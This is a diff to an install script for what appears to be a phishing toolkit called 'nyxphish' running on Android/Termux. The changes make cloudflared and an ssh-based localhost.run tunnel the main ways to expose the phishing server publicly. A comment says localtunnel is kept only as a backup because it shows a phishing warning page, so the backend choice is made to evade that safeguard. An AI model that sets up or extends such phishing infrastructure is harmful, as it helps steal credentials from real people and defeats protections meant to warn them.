@@ -16,28 +16,38 @@ fi
 echo -e "${C}[*] updating packages...${N}"
 $PKG update -y && $PKG upgrade -y
 
-echo -e "${C}[*] installing python, nodejs, wget, curl...${N}"
-$PKG install python nodejs wget curl -y
+echo -e "${C}[*] installing python, cloudflared, openssh, wget, curl...${N}"
+$PKG install python cloudflared openssh wget curl -y 2>/dev/null || {
+    # cloudflared may be missing from some repos — fall back to manual binary
+    $PKG install python openssh wget curl -y
+    echo -e "${Y}[*] cloudflared not in repo, downloading binary...${N}"
+    ARCH=$(uname -m)
+    case "$ARCH" in
+        aarch64|arm64) CF_ARCH="arm64" ;;
+        armv7l|arm)    CF_ARCH="arm" ;;
+        x86_64|amd64)  CF_ARCH="amd64" ;;
+        *)             CF_ARCH="arm64" ;;
+    esac
+    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-$CF_ARCH" -O cloudflared
+    chmod +x cloudflared
+}
 
 echo -e "${C}[*] installing python deps (flask, requests, qrcode)...${N}"
 pip install flask requests qrcode --quiet
 
-# localtunnel
+# localtunnel (backup backend only — shows phishing interstitial in 2026)
 if ! command -v lt >/dev/null 2>&1; then
-    echo -e "${C}[*] installing localtunnel via npm...${N}"
+    echo -e "${C}[*] installing localtunnel via npm (backup backend)...${N}"
+    $PKG install nodejs -y
     npm install -g localtunnel
-    echo -e "${G}[+] localtunnel installed${N}"
-else
-    echo -e "${G}[+] localtunnel already present${N}"
+    OPENURL="$(npm root -g)/localtunnel/node_modules/openurl/openurl.js"
+    if [ -f "$OPENURL" ] && grep -q "Unsupported platform" "$OPENURL"; then
+        sed -i "s|throw new Error('Unsupported platform: ' + process.platform);|return; /* patched for android */|" "$OPENURL"
+        echo -e "${G}[+] openurl patched for android/termux${N}"
+    fi
 fi
 
-# patch openurl — crashes on android/termux ("Unsupported platform")
-# nyxphish uses nyxtunnel.js (lib API) instead, but patch lt anyway for manual use
-OPENURL="$(npm root -g)/localtunnel/node_modules/openurl/openurl.js"
-if [ -f "$OPENURL" ] && grep -q "Unsupported platform" "$OPENURL"; then
-    sed -i "s|throw new Error('Unsupported platform: ' + process.platform);|return; /* patched for android */|" "$OPENURL"
-    echo -e "${G}[+] openurl patched for android/termux${N}"
-fi
+echo -e "${G}[+] tunnel backends: cloudflared (primary), localhost.run (ssh), localtunnel (backup)${N}"
 
 chmod +x nyxphish.py
 
